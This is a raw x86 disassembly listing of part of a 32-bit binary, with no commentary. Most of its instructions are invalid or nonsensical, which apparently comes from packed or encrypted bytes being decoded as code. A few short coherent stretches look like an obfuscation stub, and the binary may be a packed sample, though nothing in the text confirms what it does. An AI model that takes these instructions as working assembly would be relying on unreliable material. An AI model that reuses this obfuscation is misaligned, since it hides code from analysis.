  40626d:	mov    edx,0x73419a42
  406272:	cdq    
  406273:	ss pop ds
  406275:	fstp   QWORD PTR [ebx-0x28]
  406278:	inc    esp
  406279:	xchg   esp,eax
  40627a:	pop    eax
  40627b:	lahf   
  40627c:	(bad)  
  40627d:	fcomp  DWORD PTR [edi+0x43508e78]
  406283:	popa   
  406284:	sbb    ebp,DWORD PTR [edx+0x28]
  406287:	push   0x39
  406289:	ret    
  40628a:	mov    ds,esp
  40628c:	pop    ss
  40628d:	dec    ebp
  40628e:	in     eax,0xb2
  406290:	fs dec eax
  406292:	pop    ds
  406293:	mov    al,ds:0xeb4b232a
  406298:	and    ebx,ebx
  40629a:	push   edi
  40629b:	dec    ecx
  40629c:	mov    al,ds:0x8432c8b0
  4062a1:	xchg   ebx,eax
  4062a2:	sbb    al,0xd7
  4062a4:	in     al,dx
  4062a5:	xlat   BYTE PTR ds:[ebx]
  4062a6:	bound  esi,QWORD PTR [eax+ecx*4-0x51]
  4062aa:	or     BYTE PTR [eax-0x32aea4fc],0x1c
  4062b1:	fisubr WORD PTR [ebx]
  4062b3:	leave  
  4062b4:	int    0xb9
  4062b6:	into   
  4062b7:	in     al,dx
  4062b8:	nop
  4062b9:	retf   0x2dbe
  4062bc:	adc    al,0x23
  4062be:	adc    ah,dh
  4062c0:	or     DWORD PTR [ecx],eax
  4062c2:	and    eax,0xf3b81c51
  4062c7:	ret    
  4062c8:	add    DWORD PTR [ecx-0x39],ecx
  4062cb:	shl    DWORD PTR [esi-0x73fb0c47],cl
  4062d1:	clc    
  4062d2:	scas   al,BYTE PTR es:[edi]
  4062d3:	cmp    al,0x1c
  4062d5:	inc    esi
  4062d6:	add    dl,bh
  4062d8:	pop    ebx
  4062d9:	je     0x406320
  4062db:	in     eax,dx
  4062dc:	push   edx
  4062dd:	add    DWORD PTR [ebp+0x52a0620d],esi
  4062e3:	adc    DWORD PTR [ebx],edx
  4062e5:	xchg   esp,eax
  4062e6:	mov    WORD PTR [ecx+0x44],?
  4062e9:	jmp    0x406299
  4062eb:	fnstenv [edi+edx*4+0x2c3002f0]
  4062f2:	addr16 cs int 0x53
  4062f6:	xor    ebp,eax
  4062f8:	mov    ecx,DWORD PTR ds:0x3f46e0b
  4062fe:	xchg   esp,eax
  4062ff:	pop    esp
  406300:	push   ecx
  406301:	xchg   esp,eax
  406302:	sahf   
  406303:	pop    ss
  406304:	es loope 0x406304
  406307:	iret   
  406308:	arpl   WORD PTR [eax],sp
  40630a:	loop   0x4062b3
  40630c:	sub    cl,bl
  40630e:	pop    eax
  40630f:	or     ah,BYTE PTR gs:[eax+0x20efbae6]
  406316:	outs   dx,BYTE PTR ds:[esi]
  406317:	lods   eax,DWORD PTR cs:[esi]
  406319:	lods   eax,DWORD PTR ds:[esi]
  40631a:	hlt    
  40631b:	pop    ds
  40631c:	add    BYTE PTR [ebp+ebx*8+0xc],cl
  406320:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406321:	mov    cl,0x65
  406323:	inc    ebx
  406324:	xchg   esp,eax
  406325:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406326:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406327:	stc    
  406328:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406329:	mov    ds:0x38bf75c3,eax
  40632e:	xor    DWORD PTR [edx-0x2d],edx
  406331:	or     al,0x68
  406333:	ins    BYTE PTR es:[edi],dx
  406334:	test   eax,0x69b79995
  406339:	mov    eax,ds:0x3f000e0f
  40633e:	arpl   WORD PTR [eax+edx*2+0x7a74caf7],di
  406345:	fist   DWORD PTR [eax+0x680b2879]
  40634b:	inc    ebp
  40634c:	not    BYTE PTR [eax+0x73ae833b]
  406352:	xchg   edi,eax
  406353:	repnz mov ds,ecx
  406356:	jo     0x40632b
  406358:	add    eax,0x93a3078b
  40635d:	pusha  
  40635e:	pop    ss
  40635f:	xchg   esp,eax
  406360:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406361:	imul   esp,DWORD PTR [ecx],0xe
  406364:	iret   
  406365:	sub    DWORD PTR [edx+0x23c526c4],ecx
  40636b:	(bad)  
  40636c:	push   edx
  40636d:	mov    edi,0x9067c135
  406372:	mov    ecx,0x1f040af6
  406377:	dec    edx
  406378:	push   ecx
  406379:	(bad)  [edi]
  40637b:	push   ecx
  40637c:	mov    al,0x1e
  40637e:	scas   eax,DWORD PTR es:[edi]
  40637f:	push   ss
  406380:	add    al,0xe2
  406382:	dec    ecx
  406383:	fisubr WORD PTR [eax-0x4d963628]
  406389:	nop
  40638a:	inc    ecx
  40638b:	mov    edx,0x783e771e
  406390:	shl    BYTE PTR [eax+0x4b],cl
  406393:	jp     0x40640b
  406395:	daa    
  406396:	xchg   ebp,eax
  406397:	jns    0x406355
  406399:	outs   dx,BYTE PTR ds:[esi]
  40639a:	cli    
  40639b:	popa   
  40639c:	mov    al,al
  40639e:	repnz sbb eax,0xd463f49f
  4063a4:	call   FWORD PTR [eax]
  4063a6:	shl    DWORD PTR [esi-0x21],cl
  4063a9:	imul   al
  4063ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4063ac:	mov    edx,0x8ed27379
  4063b1:	ds xchg esi,eax
  4063b3:	xlat   BYTE PTR ds:[ebx]
  4063b4:	nop
  4063b5:	mov    ah,0x8b
  4063b7:	ins    BYTE PTR es:[edi],dx
  4063b8:	or     eax,0x7dfccb64
  4063bd:	push   0xffffffd6
  4063bf:	mov    ds,WORD PTR [esi+edx*1]
  4063c2:	in     eax,dx
  4063c3:	mov    ah,0x6b
  4063c5:	jbe    0x40642c
  4063c7:	dec    edi
  4063c8:	inc    ebp
  4063c9:	imul   edi,DWORD PTR [ebp+0xe],0x46489737
  4063d0:	cs push 0xab5580a0
  4063d6:	lods   eax,DWORD PTR ds:[esi]
  4063d7:	in     al,dx
  4063d8:	loop   0x406408
  4063da:	xor    BYTE PTR [eax],ch
  4063dc:	jbe    0x4063e1
  4063de:	int    0xfd
  4063e0:	std    
  4063e1:	inc    ebp
  4063e2:	push   edx
  4063e3:	enter  0x711e,0xc1
  4063e7:	outs   dx,DWORD PTR ds:[esi]
  4063e8:	xchg   ebx,esp
  4063ea:	repnz xchg edi,eax
  4063ec:	jge    0x40641f
  4063ee:	pushf  
  4063ef:	ss push cs
  4063f1:	je     0x406425
  4063f3:	arpl   WORD PTR [di+0x4c7b],di
  4063f8:	pushf  
  4063f9:	jb     0x4063e2
  4063fb:	or     al,0x97
  4063fd:	inc    edx
  4063fe:	jno    0x406420
  406400:	sar    DWORD PTR [esp+eax*4-0x75cd0a75],cl
  406407:	fsubr  st(5),st
  406409:	xor    al,0xc7
  40640b:	xor    cl,bl
  40640d:	mov    ?,WORD PTR [esi]
  40640f:	sbb    DWORD PTR [edx+0x2c],0xffffffff
  406413:	pop    edi
  406414:	(bad)  
  406416:	push   ss
  406417:	cld    
  406418:	shr    edx,0x2
  40641b:	sub    edx,0x5589
  406421:	mov    DWORD PTR [ebp-0x1c],ecx
  406424:	or     DWORD PTR ds:0x4229ae,edx
  40642a:	mov    ecx,DWORD PTR [ebx]
  40642c:	and    DWORD PTR ds:0x4228fe,edi
  406432:	mov    edx,DWORD PTR [ebx+0x4]
  406435:	xor    DWORD PTR [ebp-0x1c],edi
  406438:	or     DWORD PTR ds:0x4228ee,0x53f5
  406442:	xor    edx,edx
  406444:	jmp    0x4069ce
  406449:	fisttp DWORD PTR [ecx+0x7b]
  40644c:	mov    WORD PTR [ecx],ds
  40644e:	xor    al,0xe0
  406450:	sbb    BYTE PTR [ebp+0x4d6e9a4b],bl
  406456:	add    ebp,DWORD PTR ds:[eax+0x16168365]
  40645d:	cmp    eax,0xe1161604
  406462:	mov    ecx,0x2afc1514
  406467:	ret    
  406468:	loopne 0x406436
  40646a:	dec    edi
  40646b:	repnz add ch,bl
  40646e:	sub    al,0x5d
  406470:	imul   ecx,DWORD PTR [ebx],0xffffffb9
  406473:	popf   
  406474:	pop    es
  406475:	inc    ecx
  406476:	adc    ebp,DWORD PTR [esi+0x190b085a]
  40647c:	and    ch,BYTE PTR [ecx+ebx*1-0x28c8af41]
  406483:	mov    esp,0x63afe654
  406488:	stos   BYTE PTR es:[edi],al
  406489:	les    edi,FWORD PTR [ebx-0x79b4cd09]
  40648f:	sbb    eax,0x156acc9a
  406494:	popf   
  406495:	xchg   edx,eax
  406496:	aad    0xfc
  406498:	jmp    0xaf4e:0x45f20b04
  40649f:	call   0xc4331d80
  4064a4:	scas   al,BYTE PTR es:[edi]
  4064a5:	xchg   esi,eax
  4064a6:	into   
  4064a7:	xchg   BYTE PTR [ecx-0x3b],dh
  4064aa:	cmp    al,0xc8
  4064ac:	jmp    0xd8ac6f25
  4064b1:	xchg   BYTE PTR [esi],ah
  4064b3:	and    al,0x2b
  4064b5:	sbb    DWORD PTR [ebx+0x5],0x6e5eac57
  4064bc:	and    ah,dl
  4064be:	adc    BYTE PTR [edi],ah
  4064c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4064c1:	js     0x4064a4
  4064c3:	sbb    dl,ch
  4064c5:	and    al,0x6f
  4064c7:	(bad)  
  4064c8:	jle    0x4064b7
  4064ca:	(bad)  
  4064cb:	push   esp
  4064cc:	(bad)  
  4064cd:	sub    al,0xc1
  4064cf:	sub    edx,ecx
  4064d1:	data16 cmc 
  4064d3:	jmp    0xa9062be
  4064d8:	jns    0x40654b
  4064da:	add    eax,0xeeff7f2a
  4064df:	mov    dh,0x76
  4064e1:	cmp    bl,BYTE PTR [edx]
  4064e3:	jmp    FWORD PTR [ecx+0x14]
  4064e6:	pop    ecx
  4064e7:	fldenv [edx+0x135f56c7]
  4064ed:	gs or  al,0x7f
  4064f0:	mov    cl,0x3d
  4064f2:	cmp    BYTE PTR [edx+0x43],al
  4064f5:	jo     0x40653c
  4064f7:	iret   
  4064f8:	enter  0xf8a0,0xf1
  4064fc:	stos   DWORD PTR es:[edi],eax
  4064fd:	mov    gs,esi
  4064ff:	adc    BYTE PTR [eax-0x7dfa6082],ch
  406505:	rol    BYTE PTR [ecx],1
  406507:	in     al,dx
  406508:	cmp    eax,0x9af10ca9
  40650d:	addr16 mov esp,0xf31d0fe9
  406513:	cmc    
  406514:	jge    0x406548
  406516:	fdiv   st(1),st
  406518:	sahf   
  406519:	shl    DWORD PTR [eax],1
  40651b:	pop    edi
  40651c:	jnp    0x4064c7
  40651e:	adc    al,BYTE PTR [eax-0x503ad803]
  406524:	repz xchg dh,al
  406527:	adc    ebp,DWORD PTR [esi-0x7ec48d7a]
  40652d:	sti    
  40652e:	mov    ebp,0x5506b2a4
  406533:	add    ebp,DWORD PTR [esi]
  406535:	mov    cs,WORD PTR [ebp+0x6d]
  406538:	ins    DWORD PTR es:[edi],dx
  406539:	and    bh,BYTE PTR [ebp+0x5f2a4347]
  40653f:	ss call 0xd8edeff1
  406545:	scas   al,BYTE PTR es:[edi]
  406546:	aam    0x42
  406548:	xchg   esi,eax
  406549:	outs   dx,DWORD PTR ds:[esi]
  40654a:	pop    ebx
  40654b:	pop    ds
  40654c:	std    
  40654d:	xor    cl,BYTE PTR ds:0xf980edd2
  406553:	rol    ebp,0x83
  406556:	pop    ebp
  406557:	scas   al,BYTE PTR es:[edi]
  406558:	into   
  406559:	xor    DWORD PTR [edi+ebp*1],0xd41a18f0
  406560:	xor    al,0x25
  406562:	mov    bh,0x9e
  406564:	jge    0x4065d1
  406566:	int3   
  406567:	pop    eax
  406568:	daa    
  406569:	mov    ds:0x45185706,eax
  40656e:	adc    DWORD PTR [edx-0x19af17ba],ebp
  406574:	dec    ecx
  406575:	inc    ebp
  406576:	out    0xd5,eax
  406578:	push   eax
  406579:	jmp    0xc862:0xa23c15d4
  406580:	jge    0x40655b
  406582:	push   ebx
  406583:	pop    edi
  406584:	push   edi
  406585:	test   DWORD PTR [eax],0x3236bac9
  40658b:	xchg   ebp,eax
  40658c:	stc    
  40658d:	pop    eax
  40658e:	xchg   esp,eax
  40658f:	in     eax,dx
  406590:	(bad)  
  406591:	cmp    ch,BYTE PTR [esi+0x2dd2ec17]
  406597:	rcr    DWORD PTR [esi-0x43],cl
  40659a:	and    eax,0x509b5dee
  40659f:	lea    edi,[edi+0x37]
  4065a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4065a3:	ror    DWORD PTR ds:0x7dad2aa4,cl
  4065a9:	dec    esi
  4065aa:	loopne 0x4065c3
  4065ac:	mov    edx,DWORD PTR [ebp-0x18]
  4065af:	and    dl,BYTE PTR [ecx+ecx*8+0x3e30e4f0]
  4065b6:	js     0x406598
  4065b8:	test   DWORD PTR [ebp-0x77],0xa3894a86
  4065bf:	jnp    0x406571
  4065c1:	leave  
  4065c2:	sub    bl,bh
  4065c4:	ins    DWORD PTR es:[edi],dx
  4065c5:	fs push ecx
  4065c7:	or     DWORD PTR [eax-0x1f],ecx
  4065ca:	or     eax,0xd404fb80
  4065cf:	lahf   
  4065d0:	sub    bl,dl
  4065d2:	and    DWORD PTR [edi+0x2be622b4],eax
  4065d8:	das    
  4065d9:	ficomp DWORD PTR [ebx]
  4065db:	sub    esp,DWORD PTR [edx-0x8]
  4065de:	adc    ebp,edi
  4065e0:	sub    DWORD PTR [ebx-0x21],edx
  4065e3:	lock sub ah,cl
  4065e6:	mul    BYTE PTR [edi-0xd]
  4065e9:	ja     0x406646
  4065eb:	mov    bl,0x4f
  4065ed:	jp     0x406592
  4065ef:	stc    
  4065f0:	push   0xffffffc7
  4065f2:	cs jge 0x40659e
  4065f5:	push   ecx
  4065f6:	je     0x406637
  4065f8:	mov    ch,ah
  4065fa:	and    bh,dl
  4065fc:	jno    0x406588
  4065fe:	rcl    DWORD PTR [edi],0xa3
  406601:	inc    ebp
  406602:	xor    eax,0x50aac5d0
  406607:	jl     0x4065a7
  406609:	add    bh,dh
  40660b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40660c:	sbb    edx,DWORD PTR ds:0xc9d3f982
  406612:	mov    bh,0x67
  406614:	inc    ebp
  406615:	add    DWORD PTR fs:[edi-0x79],esi
  406619:	jmp    0x406630
  40661b:	(bad)  
  40661c:	xchg   ebx,eax
  40661d:	mov    edx,0xead2a17e
  406622:	push   es
  406623:	call   0x72a3e0a6
  406628:	dec    edi
  406629:	sub    DWORD PTR [ecx-0x8],esi
  40662c:	mov    bh,dl
  40662e:	shl    DWORD PTR [edi-0x779bc30d],0x50
  406635:	shl    DWORD PTR ds:0x6e3b5621,1
  40663b:	mov    esi,0x222d12b1
  406640:	add    ch,bh
  406642:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406643:	icebp  
  406644:	inc    eax
  406645:	mov    ds:0x92160e76,al
  40664a:	js     0x4066a2
  40664c:	push   0x8d528ceb
  406651:	cmp    BYTE PTR [esi-0xcb65540],bh
  406657:	std    
  406658:	ds popa 
  40665a:	mov    al,0x40
  40665c:	mov    bh,0x5c
  40665e:	stos   BYTE PTR es:[edi],al
  40665f:	jb     0x40662c
  406661:	out    0x59,eax
  406663:	repz sub eax,0x5342b8a4
  406669:	jnp    0x406606
  40666b:	test   al,0x2f
  40666d:	jnp    0x40664b
  40666f:	repz repnz push edx
  406672:	cmc    
  406673:	push   ecx
  406674:	rol    BYTE PTR [eax+0x2ea038eb],1
  40667a:	mov    bh,0x83
  40667c:	ficom  DWORD PTR [ecx+0x4a]
  40667f:	inc    eax
  406680:	xchg   edi,eax
  406681:	retf   
  406682:	(bad)  
  406683:	or     eax,0xbddf1276
  406688:	mov    ebp,0x864fd83c
  40668d:	inc    ebx
  40668e:	ins    DWORD PTR es:[edi],dx
  40668f:	cmp    bh,ch
  406691:	arpl   WORD PTR [ebx-0x4a],di
  406694:	xchg   edx,eax
  406695:	jnp    0x406621
  406697:	mov    dh,0xca
  406699:	pop    ds
  40669a:	(bad)  
  40669c:	into   
  40669d:	dec    ebp
  40669e:	push   esi
  40669f:	(bad)  
  4066a0:	jae    0x406675
  4066a2:	dec    ecx
  4066a3:	jge    0x406706
  4066a5:	cmp    al,0xbd
  4066a7:	push   0xffffffeb
  4066a9:	jecxz  0x406723
  4066ab:	in     al,0x3b
  4066ad:	and    BYTE PTR [eax+edx*4+0x29],ah
  4066b1:	adc    dh,BYTE PTR [edi]
  4066b3:	push   eax
  4066b4:	sbb    al,0x63
  4066b6:	push   ds
  4066b7:	jp     0x406728
  4066b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4066ba:	sbb    eax,0x44e4cf63
  4066bf:	fdiv   QWORD PTR [esi]
  4066c1:	fdivr  st,st(7)
  4066c3:	jmp    0x1065:0xf12e2b86
  4066ca:	in     eax,dx
  4066cb:	rep stos DWORD PTR es:[edi],eax
  4066cd:	adc    dl,BYTE PTR [ecx]
  4066cf:	(bad)  
  4066d0:	mov    esp,0x81c5643c
  4066d5:	int    0xa9
  4066d7:	sti    
  4066d8:	in     eax,dx
  4066d9:	scas   al,BYTE PTR es:[edi]
  4066da:	cmp    edi,ecx
  4066dc:	mov    BYTE PTR [ebp+0x72],dl
  4066df:	push   0x6e
  4066e1:	or     DWORD PTR [ebx+0x59f43e4b],edi
  4066e7:	push   esp
  4066e8:	rcr    DWORD PTR [ecx],cl
  4066ea:	push   ds
  4066eb:	cmp    al,0x12
  4066ed:	sub    BYTE PTR [ebp+0x67],dl
  4066f0:	(bad)  
  4066f1:	bound  esi,QWORD PTR [eax]
  4066f3:	inc    edi
  4066f4:	mov    edi,0xe860334b
  4066f9:	nop    DWORD PTR [edi+0x23]
  4066fd:	adc    cl,BYTE PTR [ebp-0x5cbcc183]
  406703:	sub    DWORD PTR [edi-0x5e],esp
  406706:	mov    dh,0xe7
  406708:	mov    dl,0x43
  40670a:	xchg   ebp,eax
  40670b:	imul   edi,DWORD PTR [edx],0xd1b5b057
  406711:	xchg   esp,eax
  406712:	and    eax,0x390816ad
  406717:	test   eax,0x9d0dc5d4
  40671c:	mov    dl,0xe8
  40671e:	push   ss
  40671f:	mov    edx,0x34486572
  406724:	adc    eax,0x198ba4ee
  406729:	lods   eax,DWORD PTR ds:[esi]
  40672a:	mov    bh,BYTE PTR [edx+0x7f]
  40672d:	lods   eax,DWORD PTR ds:[esi]
  40672e:	(bad)  
  406730:	mov    al,0x97
  406732:	lahf   
  406733:	xchg   ebp,eax
  406734:	(bad)  
  406735:	repnz cdq 
  406737:	cwde   
  406738:	loope  0x406732
  40673a:	in     al,dx
  40673b:	out    0xef,eax
  40673d:	inc    esp
  40673e:	sub    eax,0xdfbb4c0a
  406743:	pop    edx
  406744:	sub    BYTE PTR [esi],0x13
  406747:	repnz add BYTE PTR [ecx+0x32898331],0x5d
  40674f:	inc    ebx
  406750:	les    eax,FWORD PTR [eax]
  406752:	sub    al,bl
  406754:	pop    eax
  406755:	aaa    
  406756:	mov    edi,0xfc6dec66
  40675b:	or     al,0xf
  40675d:	daa    
  40675e:	mov    dl,0xf6
  406760:	jb     0x406765
  406762:	add    eax,0x6d769fe5
  406767:	repz (bad) 
  40676a:	aas    
  40676b:	jg     0x406756
  40676d:	shl    DWORD PTR [edi*2-0x4633cf09],cl
  406774:	mov    edx,0xddf19884
  406779:	and    dl,BYTE PTR [edi+0x1c]
  40677c:	mov    al,0xba
  40677e:	cdq    
  40677f:	into   
  406780:	ja     0x4067ea
  406782:	xor    DWORD PTR [ecx-0x8889aae],eax
  406788:	in     al,dx
  406789:	and    al,BYTE PTR [ecx]
  40678b:	mov    cs,WORD PTR gs:[esi+0x34]
  40678f:	push   esp
  406790:	jg     0x4067bb
  406792:	in     al,dx
  406793:	mov    DWORD PTR [eax],ecx
  406795:	pop    ebp
  406796:	(bad)  
  406798:	mov    ebp,0x62ca3c29
  40679d:	sub    ecx,DWORD PTR [ebp+0x10b12378]
  4067a3:	sub    ebp,ebx
  4067a5:	add    al,0x6a
  4067a7:	(bad)
  4067aa:	out    dx,al
  4067ab:	je     0x40672d
  4067ad:	shl    BYTE PTR [esi-0x10],1
  4067b0:	xor    dh,cl
  4067b2:	push   es
  4067b3:	mov    al,ds:0x42840702
  4067b8:	gs inc ecx
  4067ba:	jmp    DWORD PTR [ebx+0x4b831ce4]
  4067c0:	mov    edx,0xad78adeb
  4067c5:	mov    dl,BYTE PTR [edi-0x47]
  4067c8:	sub    DWORD PTR [edx],esp
  4067ca:	mov    ah,0xb1
  4067cc:	jmp    0x406751
  4067ce:	pop    edx
  4067cf:	out    dx,eax
  4067d0:	scas   al,BYTE PTR es:[edi]
  4067d1:	sar    BYTE PTR [eax+ebp*8],1
  4067d4:	push   0xeb8774df
  4067d9:	cmp    al,0x93
  4067db:	stc    
  4067dc:	jl     0x40685c
  4067de:	mov    cs,WORD PTR [ebx-0x39]
  4067e1:	std    
  4067e2:	xchg   BYTE PTR [ecx-0x5842924],al
  4067e8:	retf   
  4067e9:	nop
  4067ea:	sub    bl,BYTE PTR [edx-0x76c1e26]
  4067f0:	jno    0x406869
  4067f2:	out    dx,al
  4067f3:	outs   dx,BYTE PTR ds:[esi]
  4067f4:	gs push ds
  4067f6:	xchg   edx,eax
  4067f7:	mov    ebp,0x59351098
  4067fc:	pop    esi
  4067fd:	add    DWORD PTR [edx],edx
  4067ff:	add    dl,BYTE PTR [ecx+0x7817fb4a]
  406805:	push   0xffffffa4
  406807:	pop    ss
  406808:	fisubr DWORD PTR [edi]
  40680a:	pushf  
  40680b:	jb     0x406807
  40680d:	lods   eax,DWORD PTR ds:[esi]
  40680e:	mov    edx,DWORD PTR es:[esi]
  406811:	stc    
  406812:	cmp    edx,DWORD PTR [edx]
  406814:	dec    ecx
  406815:	cmp    ah,BYTE PTR [ebx-0x11]
  406818:	jmp    0x647e6bb4
  40681d:	xchg   esp,eax
  40681e:	ret    0x24d3
  406821:	out    0x40,eax
  406823:	sbb    al,0x10
  406825:	and    edx,DWORD PTR [esi-0x7c3b62b1]
  40682b:	jno    0x40686a
  40682d:	ret    
  40682e:	ins    DWORD PTR es:[edi],dx
  40682f:	(bad)  
  406830:	sar    BYTE PTR [esp+edx*1-0x64a1439d],cl
  406837:	sbb    DWORD PTR [ecx+0x16],esi
  40683a:	retf   0x521b
  40683d:	(bad)  
  40683f:	cmc    
  406840:	jp     0x406865
  406842:	push   ebp
  406843:	je     0x4067df
  406845:	fimul  DWORD PTR [eax+0x60485feb]
  40684b:	mov    esi,0xc8527723
  406850:	retf   
  406851:	out    dx,eax
  406852:	or     eax,0x82e68075
  406857:	or     BYTE PTR [esp+edi*2+0x46dbf0ed],0xf5
  40685f:	fisttp DWORD PTR [esi+0x7b2b4194]
  406865:	inc    edx
  406866:	inc    esp
  406867:	dec    ebx
  406868:	push   ds
  406869:	jge    0x4068cf
  40686b:	jle    0x406832
  40686d:	mov    bl,0x18
  40686f:	mov    bl,0x98
  406871:	shl    esi,cl
  406873:	inc    esp
  406874:	dec    edx
  406875:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406877:	adc    DWORD PTR [ebx-0x6cee7d7d],ebx
  40687d:	sub    BYTE PTR [esi+0x12d07e5e],bl
  406883:	fwait
  406884:	cmp    eax,0xb4e289c7
  406889:	jle    0x406897
  40688b:	mov    edx,0x8cb1a203
  406890:	pop    ds
  406891:	xchg   esp,eax
  406892:	or     edi,DWORD PTR [esi+0x524c4984]
  406898:	fisubr DWORD PTR [ecx+edi*4]
  40689b:	data16 (bad) 
  40689d:	push   edx
  40689e:	ret    
  40689f:	push   ebp
  4068a0:	jl     0x4068b6
  4068a2:	mov    bl,0x77
  4068a4:	dec    ecx
  4068a5:	inc    ebx
  4068a6:	pusha  
  4068a7:	push   es
  4068a8:	sub    ah,dh
  4068aa:	call   0x9aaa:0x968a9edb
  4068b1:	push   0xffffffb5
  4068b3:	les    esi,FWORD PTR [edx]
  4068b5:	mov    fs,WORD PTR [edi]
  4068b7:	cmp    al,0x2a
  4068b9:	xchg   edi,eax
  4068ba:	push   ebx
  4068bb:	and    edi,DWORD PTR [edi-0x24]
  4068be:	push   eax
  4068bf:	pushf  
  4068c0:	sti    
  4068c1:	rcl    esi,0xdd
  4068c4:	sbb    BYTE PTR [ebp+0x3b],bh
  4068c7:	int3   
  4068c8:	mov    eax,ds:0xd0bf4d3c
  4068cd:	dec    esi
  4068ce:	retf   
  4068cf:	sbb    edi,DWORD PTR [ecx+edi*1-0x4daf5aac]
  4068d6:	lea    ecx,[edx+0x3197d965]
  4068dc:	mov    ds:0x11e25642,al
  4068e1:	sbb    dh,BYTE PTR [ecx+0x11beb741]
  4068e7:	lahf   
  4068e8:	jns    0x40686f
  4068ea:	xchg   edi,eax
  4068eb:	lods   al,BYTE PTR ds:[esi]
  4068ec:	inc    ebx
  4068ed:	ret    
  4068ee:	or     bh,BYTE PTR ss:[ebp+0x3e5c97f9]
  4068f5:	dec    ecx
  4068f6:	loopne 0x4068e8
  4068f8:	inc    ecx
  4068f9:	fisttp WORD PTR [ebx]
  4068fb:	mov    al,ds:0x8c603d06
  406900:	adc    al,0xcd
  406902:	inc    esp
  406903:	out    0x81,al
  406905:	mov    eax,0x8443085f
  40690a:	adc    al,0x3
  40690c:	aas    
  40690d:	retf   
  40690e:	mov    ebp,0x61c1fc1f
  406913:	adc    ch,cl
  406915:	icebp  
  406916:	outs   dx,BYTE PTR ds:[esi]
  406917:	lea    edi,ds:0x1bb30d43
  40691d:	test   DWORD PTR [ebx+ebp*1],esp
  406920:	and    eax,0x2c09c069
  406925:	jo     0x40699e
  406927:	jge    0x406901
  406929:	gs jmp 0x406905
  40692c:	dec    esi
  40692e:	jo     0x40695e
  406930:	cmp    dh,BYTE PTR [esi+0x455a3d0]
  406936:	xchg   ebx,eax
  406937:	push   0xe11e2f94
  40693c:	in     al,dx
  40693d:	pop    ecx
  40693e:	mov    WORD PTR [eax-0x5cb5fcb1],gs
  406944:	adc    al,0xaf
  406946:	jg     0x40699e
  406948:	test   al,0x5
  40694a:	bound  ecx,QWORD PTR ds:0xe497d4e4
  406950:	jo     0x12058cbc
  406956:	pushf  
  406957:	(bad)  
  406958:	imul   ecx,eax,0x56
  40695b:	enter  0xcd20,0xfd
  40695f:	or     eax,0xe58449d4
  406964:	jae    0x406905
  406966:	mov    al,0x4c
  406968:	add    ah,BYTE PTR [ecx+ebp*2-0x4d60281b]
  40696f:	xor    al,0xa4
  406971:	aaa    
  406972:	outs   dx,DWORD PTR ds:[esi]
  406973:	cmp    eax,0xd5a52739
  406978:	xchg   BYTE PTR [edi],al
  40697a:	(bad)  
  40697b:	adc    DWORD PTR [ebp+0x6d86ee45],ebx
  406981:	mov    cl,0xb9
  406983:	(bad)  
  406984:	mov    bl,0xb6
  406986:	mov    eax,0x17c42686
  40698b:	sub    al,0x1
  40698d:	imul   esp,DWORD PTR [ecx],0xfffffff0
  406990:	xor    dh,BYTE PTR [ebp+edi*4-0x5a77e99c]
  406997:	(bad)  
  406998:	jae    0x4069f6
  40699a:	(bad)  
  40699b:	(bad)  
  40699d:	fcmovne st,st(1)
  40699f:	loope  0x40694c
  4069a1:	mov    edx,0xe0f6f74a
  4069a6:	pop    esi
  4069a7:	add    al,0x65
  4069a9:	sar    ebp,1
  4069ab:	fs (bad) 
  4069ad:	pop    es
  4069ae:	mov    dl,0xb7
  4069b0:	pop    edx
  4069b1:	call   0x9f7dc63f
  4069b6:	daa    
  4069b7:	retf   0xd9dd
  4069ba:	sbb    eax,0x167f62bd
  4069bf:	test   eax,0xcc58a3d2
  4069c4:	and    dh,BYTE PTR [esi-0x41b0fcac]
  4069ca:	xor    DWORD PTR [ebp+0x3b],0x1c
  4069ce:	or     edx,DWORD PTR [ebp-0x1c]
  4069d1:	shl    ecx,0x1e
  4069d4:	sub    DWORD PTR ds:0x4228b2,0x1171
  4069de:	imul   edx,DWORD PTR [ebp-0x2c]
  4069e2:	sub    DWORD PTR [eax],edx
  4069e4:	mov    DWORD PTR ds:0x4228ae,0x6b62
  4069ee:	jmp    0x4076e1
  4069f3:	sub    edx,ecx
  4069f5:	mov    ecx,DWORD PTR [esi]
  4069f7:	mov    edx,DWORD PTR [esi+0x4]
  4069fa:	sbb    DWORD PTR ds:0x42293a,0x607d
  406a04:	shrd   ecx,edx,0x2
  406a08:	mov    DWORD PTR [ebp-0x1c],ecx
  406a0b:	mov    ecx,DWORD PTR [esi]
  406a0d:	xor    DWORD PTR [ebp-0x1c],edi
  406a10:	adc    DWORD PTR ds:0x42288e,0x77db
  406a1a:	jmp    0x406fa4
  406a1f:	bound  ebx,QWORD PTR [ecx-0xe]
  406a22:	imul   edi,ecx,0x71
  406a25:	push   edx
  406a26:	pop    eax
  406a27:	fst    DWORD PTR [eax]
  406a29:	std    
  406a2a:	mov    ah,0xea
  406a2c:	shr    BYTE PTR [esi+ebp*4+0x16168192],1
  406a33:	cmp    eax,0x68161604
  406a38:	jmp    0xc949:0x7c5c2dd7
  406a3f:	jno    0x406a98
  406a41:	dec    eax
  406a42:	cwde   
  406a43:	xor    esp,DWORD PTR [edi]
  406a45:	rcr    DWORD PTR [edi],0xf1
  406a48:	mov    dh,0x2c
  406a4a:	push   edi
  406a4b:	sub    BYTE PTR [ebp+0x45],ah
  406a4e:	jmp    0x499f:0xc8bef4d0
  406a55:	dec    edx
  406a56:	pop    edx
  406a57:	mov    edi,0xaf6c8a3
  406a5c:	pop    edi
  406a5d:	and    esi,DWORD PTR [edi-0x45]
  406a60:	push   ds
  406a61:	adc    ah,ch
  406a63:	or     ch,BYTE PTR [ecx-0x56a6ba57]
  406a69:	mov    bh,0xba
  406a6b:	sub    al,BYTE PTR [ecx]
  406a6d:	or     eax,0xe5ed2ee4
  406a72:	jne    0x406ad5
